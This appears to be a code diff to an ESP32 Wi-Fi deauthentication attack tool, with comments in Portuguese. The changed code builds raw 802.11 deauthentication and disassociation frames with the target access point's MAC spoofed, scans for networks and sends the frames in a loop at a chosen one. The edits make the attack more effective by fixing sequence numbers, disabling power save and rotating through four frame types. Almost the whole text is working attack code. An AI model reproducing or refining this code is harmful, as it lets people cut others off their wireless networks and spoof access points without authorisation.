@@ -3,31 +3,51 @@
 #include "config.h"
 
 // ============================================================
-// DEAUTH FRAME (Management Frame - Deauthentication)
-// Frame Control: 0xC0 = Deauthentication, 0x00 = flags
+// DEAUTH / DISASSOC FRAMES
+// 
+// Frame Control: 0xC0 = Deauth, 0xA0 = Disassoc
+// Duration: 0x3A, 0x01 = 314us (padrão)
+// DA: Destination Address
+// SA: Source Address (AP MAC)
+// BSSID: BSSID (AP MAC)
+// Seq Ctrl: deixado em 0x00, 0x00 (driver incrementa com en_sys_seq=true)
+// Reason Code: 0x01, 0x00 = Unspecified reason
 // ============================================================
+
+// Deauth: AP -> Broadcast (todos os clientes)
 static uint8_t deauthFrame[26] = {
     0xC0, 0x00,             // Frame Control: Deauth
     0x3A, 0x01,             // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC (offset 10)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC (offset 16)
-    0x00, 0x00,             // Seq Ctrl
-    0x07, 0x00              // Reason: 7 = Class 3 frame from non-associated STA
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast [4]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
+    0x00, 0x00,             // Seq Ctrl [22] - DRIVER INCREMENTA
+    0x01, 0x00              // Reason Code: 1 = Unspecified [24]
 };
 
-// Frame reverso: AP -> STA (direcionado)
-static uint8_t deauthFrameReverse[26] = {
+// Deauth: AP -> STA (direcionado)
+static uint8_t deauthFrameToSTA[26] = {
     0xC0, 0x00,
     0x3A, 0x01,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: STA MAC (offset 4)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC (offset 10)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC (offset 16)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: STA MAC [4]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
     0x00, 0x00,
-    0x07, 0x00
+    0x01, 0x00
 };
 
-// Disassociation frame (mais agressivo)
+// Deauth: STA -> AP (reverso)
+static uint8_t deauthFrameFromSTA[26] = {
+    0xC0, 0x00,
+    0x3A, 0x01,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: AP MAC [4]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: STA MAC [10] 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
+    0x00, 0x00,
+    0x01, 0x00
+};
+
+// Disassociation: AP -> Broadcast
 static uint8_t disassocFrame[26] = {
     0xA0, 0x00,             // Frame Control: Disassociation
     0x3A, 0x01,
@@ -35,7 +55,7 @@ static uint8_t disassocFrame[26] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00,
-    0x08, 0x00              // Reason: 8 = STA leaving
+    0x01, 0x00              // Reason: 1 = Unspecified
 };
 
 // ============================================================
@@ -62,7 +82,6 @@ void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
 // ============================================================
 void scanNetworks() {
     networkCount = 0;
-
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(true);
     delay(200);
@@ -77,8 +96,10 @@ void scanNetworks() {
         scannedNetworks[i].rssi = WiFi.RSSI(i);
         scannedNetworks[i].channel = WiFi.channel(i);
         scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
-        Serial.printf("[WiFi] %d: %s CH%d RSSI%d\n",
-            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi);
+        Serial.printf("[WiFi] %d: %s CH%d RSSI%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
+            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi,
+            scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], scannedNetworks[i].bssid[2],
+            scannedNetworks[i].bssid[3], scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
         networkCount++;
     }
     WiFi.scanDelete();
@@ -102,38 +123,44 @@ void startDeauth(uint8_t networkIndex) {
 
     NetworkInfo* target = &scannedNetworks[networkIndex];
 
-    // Salva info do alvo
     memcpy(deauthTargetBSSID, target->bssid, 6);
     strncpy(deauthTargetSSID, target->ssid, 32);
     deauthTargetSSID[32] = '\0';
     deauthTargetChannel = target->channel;
     deauthTargetAuth = target->encrypted ? 1 : 0;
 
-    // Configura frames com MAC do alvo
-    setMAC(deauthFrame, target->bssid, 10);  // SA = AP
-    setMAC(deauthFrame, target->bssid, 16);  // BSSID = AP
+    // Configura frames com MAC do AP
+    setMAC(deauthFrame, target->bssid, 10);
+    setMAC(deauthFrame, target->bssid, 16);
 
-    setMAC(deauthFrameReverse, target->bssid, 10);  // SA = AP
-    setMAC(deauthFrameReverse, target->bssid, 16);  // BSSID = AP
+    setMAC(deauthFrameToSTA, target->bssid, 10);
+    setMAC(deauthFrameToSTA, target->bssid, 16);
+
+    setMAC(deauthFrameFromSTA, target->bssid, 4);   // DA = AP
+    setMAC(deauthFrameFromSTA, target->bssid, 16);  // BSSID = AP
+    // SA = broadcast (vamos usar o MAC do AP também para spoofing)
+    setMAC(deauthFrameFromSTA, target->bssid, 10);
 
     setMAC(disassocFrame, target->bssid, 10);
     setMAC(disassocFrame, target->bssid, 16);
 
-    // MODO CRUCIAL: promiscuous mode + STA desconectado
+    // === PREPARA WIFI ===
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(true);
     delay(100);
 
-    // Ativa modo promiscuo (necessario para raw frames funcionarem)
+    // Promiscuous mode ON
     esp_wifi_set_promiscuous(true);
     delay(50);
 
-    // MUDA PARA O CANAL DO ALVO (ESSENCIAL!)
+    // Desliga power save
+    esp_wifi_set_ps(WIFI_PS_NONE);
+
+    // MUDA PARA O CANAL DO ALVO
     esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
     Serial.printf("[Deauth] Target: %s CH%d\n", target->ssid, target->channel);
     Serial.printf("[Deauth] Set channel result: %d\n", chErr);
 
-    // Reseta contadores
     deauthActive = true;
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
@@ -154,58 +181,60 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH - ENVIA FRAMES EM BURST AGRESSIVO
+// LOOP DE DEAUTH - CORRIGIDO
+// 
+// MUDANÇAS CRÍTICAS:
+// 1. en_sys_seq = true (driver incrementa sequence number)
+// 2. Sem delay() entre frames (deixa o driver gerenciar)
+// 3. Apenas 1 frame por chamada (evita encher fila do driver)
+// 4. Alterna entre 4 tipos de frames para máxima efetividade
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
+    static uint8_t cycle = 0;
     bool anySuccess = false;
+    esp_err_t err = ESP_OK;
 
-    // Burst de 10 frames por chamada (taxa alta)
-    for (int burst = 0; burst < 10; burst++) {
-        // Frame 1: Deauth Broadcast (AP -> todos)
-        esp_err_t err1 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
-        if (err1 == ESP_OK) {
-            deauthSuccessCount++;
-            anySuccess = true;
-        } else {
-            lastDeauthError = err1;
-            deauthFailCount++;
-        }
-        deauthPacketCount++;
-
-        // Frame 2: Deauth Broadcast reverso
-        esp_err_t err2 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameReverse, 26, false);
-        if (err2 == ESP_OK) {
-            deauthSuccessCount++;
-            anySuccess = true;
-        } else {
-            lastDeauthError = err2;
-            deauthFailCount++;
-        }
-        deauthPacketCount++;
-
-        // Frame 3: Disassociation (mais agressivo)
-        esp_err_t err3 = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, 26, false);
-        if (err3 == ESP_OK) {
-            deauthSuccessCount++;
-            anySuccess = true;
-        } else {
-            lastDeauthError = err3;
-            deauthFailCount++;
-        }
-        deauthPacketCount++;
-
-        delayMicroseconds(100);  // Pequeno delay entre frames
+    // Alterna entre 4 tipos de frames
+    switch (cycle % 4) {
+        case 0:
+            err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, true);
+            break;
+        case 1:
+            err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameToSTA, 26, true);
+            break;
+        case 2:
+            err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameFromSTA, 26, true);
+            break;
+        case 3:
+            err = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, 26, true);
+            break;
     }
+    cycle++;
+
+    if (err == ESP_OK) {
+        deauthSuccessCount++;
+        anySuccess = true;
+    } else {
+        lastDeauthError = err;
+        deauthFailCount++;
+        // Loga os primeiros erros para debug
+        if (deauthFailCount <= 5) {
+            Serial.printf("[Deauth] TX ERR cycle=%d err=%d\n", cycle % 4, err);
+        }
+    }
+    deauthPacketCount++;
 
     // Debug a cada ~2 segundos
     static uint32_t lastDebug = 0;
     if (millis() - lastDebug > 2000) {
         lastDebug = millis();
-        Serial.printf("[Deauth] pkt=%lu succ=%lu fail=%lu err=%d ch=%d\n",
+        float rate = (deauthPacketCount > 0) ? 
+            ((float)deauthSuccessCount / deauthPacketCount * 100.0) : 0;
+        Serial.printf("[Deauth] pkt=%lu succ=%lu fail=%lu rate=%.1f%% ch=%d\n",
             deauthPacketCount, deauthSuccessCount, deauthFailCount, 
-            (int)lastDeauthError, deauthTargetChannel);
+            rate, deauthTargetChannel);
     }
 
     return anySuccess;
